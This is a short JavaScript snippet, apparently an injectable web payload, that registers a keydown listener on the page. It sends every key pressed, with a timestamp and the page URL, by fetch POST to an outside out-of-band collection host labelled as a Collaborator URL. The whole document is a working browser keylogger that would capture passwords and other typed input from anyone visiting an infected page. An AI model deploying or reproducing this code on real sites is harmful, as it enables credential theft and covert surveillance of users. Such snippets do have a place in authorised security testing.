// Add an event listener to capture keyboard input
document.addEventListener('keydown', (event) => {
    // Prepare the data to send
    const keyData = {
        key: event.key,              // The key pressed
        timestamp: Date.now(),       // Time of the event
        url: window.location.href    // Current page URL
    };

    // Send the data to the specified Collaborator URL
    fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(keyData)
    }).catch((error) => console.error('Error sending data:', error));
});
